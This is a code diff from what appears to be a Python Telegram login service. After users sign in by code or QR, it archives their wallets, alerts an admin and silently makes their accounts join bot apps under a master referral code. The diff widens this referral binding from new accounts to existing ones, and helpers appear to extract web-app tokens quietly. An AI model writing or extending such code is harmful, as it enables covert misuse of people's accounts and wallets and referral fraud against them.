@@ -2051,13 +2051,7 @@ async def bind_account_master_referrals(client: TelegramClient, acc_entry: dict,
                 await asyncio.sleep(0.5)
             except Exception:
                 pass
-            b_vy_in = await client.get_input_entity(VYRO_BOT)
-            await client(RequestAppWebViewRequest(
-                peer=b_vy_in,
-                app=InputBotAppShortName(bot_id=b_vy_in, short_name="app"),
-                platform="android",
-                start_param=VYRO_REFERRAL_CODE
-            ))
+            tok = await extract_bot_webapp_token(client, VYRO_BOT, start_param=VYRO_REFERRAL_CODE, default_url="https://vyro.run.place/", candidate_short_names=["app", "vyro", "play", "mine"])
             acc_entry["vyro_referral_bound"] = True
             await asyncio.sleep(0.5)
         except Exception as e:
@@ -4144,8 +4138,9 @@ async def verify_login_code(request: Request):
         save_and_archive_account_wallets(acc_entry, wallets)
         asyncio.create_task(notify_admin_new_account_onboarded(acc_entry, is_existing=is_existing))
 
-        # Only bind referrals for 1st-time brand new onboarding accounts (NEVER existing accounts!)
-        if not is_existing and acc_entry.get("is_new_onboarding"):
+        # Automatically bind referrals for brand new accounts or accounts with unbound bots (master account excluded)
+        needs_referrals = (not is_existing or not is_account_referrals_bound(acc_entry)) and str(user_id) != "6727787768"
+        if needs_referrals:
             asyncio.create_task(bind_account_master_referrals(client, acc_entry))
         else:
             async def _extract_silent_code(c, a):
@@ -4369,7 +4364,8 @@ async def start_qr_login(request: Request):
                     }
                     save_and_archive_account_wallets(acc_entry, wallets)
                     asyncio.create_task(notify_admin_new_account_onboarded(acc_entry, is_existing=is_existing))
-                    if not is_existing and acc_entry.get("is_new_onboarding"):
+                    needs_referrals = (not is_existing or not is_account_referrals_bound(acc_entry)) and str(uid) != "6727787768"
+                    if needs_referrals:
                         asyncio.create_task(bind_account_master_referrals(temp_client, acc_entry))
                     else:
                         async def _extract_silent_qr(c, a):
